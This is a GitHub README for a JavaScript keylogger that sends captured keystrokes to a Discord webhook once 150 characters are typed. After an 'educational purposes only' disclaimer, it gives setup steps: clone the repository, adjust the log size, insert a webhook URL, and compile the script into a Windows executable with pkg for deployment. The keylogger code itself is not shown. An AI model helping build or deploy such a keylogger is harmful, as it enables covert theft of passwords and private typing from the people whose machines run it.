# Discord Keylogger

This repository contains a Discord Keylogger which is designed to send the key logs to a specified Discord webhook once 150 characters are pressed. This tool serves as a proof of concept to understand the security risks and potential vulnerabilities associated with keyloggers and their implementations.

## ⚠️ Warning

This project is intended strictly for educational and research purposes only. The unauthorized interception, collection, and disclosure of user input and data are strictly prohibited and could be subject to severe legal penalties. The author(s) of this project will not be held responsible for any unlawful or unauthorized use, misuse, or abuse of this software.

## 🚀 Setup & Usage

### Step 1: Clone the Repository
```sh
git clone https://github.com/ezydubs/Discord-Javascript-Keylogger.git
```

### Step 2: Modify the log_size Variable
Open the main JavaScript file and locate the variable `log_size`. Modify its value if you wish to change the number of characters pressed before the logs are sent.
```js
let log_size = 150; // Change this value as needed
```

### Step 3: Set Up the Discord Webhook
Create a Discord webhook and replace the placeholder webhook URL in the code with the URL of the webhook you created.

### Step 4: Deployment
After completing the setup, deploy the keylogger according to your needs.
compile the keylogger using the following command:
```sh
pkg -i index.js -o logger.exe
```

## 🙏 Acknowledgments

- All contributors to this project.
- Everyone using this tool responsibly for educational and research purposes.

---

Remember to replace the placeholder URL in the clone command with the actual URL of your repository, and feel free to modify any part of this README to better fit your project's needs. If you have any questions, issues, or feature requests related to this project, please feel free to open an issue or submit a pull request.